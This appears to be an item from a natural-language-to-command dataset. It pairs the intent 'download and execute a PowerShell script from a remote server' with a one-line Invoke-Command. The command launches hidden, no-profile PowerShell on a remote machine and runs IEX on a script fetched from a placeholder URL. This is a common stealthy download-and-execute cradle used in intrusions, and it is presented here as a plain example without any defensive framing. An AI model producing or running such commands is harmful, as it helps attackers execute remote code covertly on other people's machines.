# Natural language intent:
# Download and execute a PowerShell script from a remote server using Invoke-Command.

Invoke-Command -ComputerName <RemoteComputerName> -ScriptBlock {powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')"}
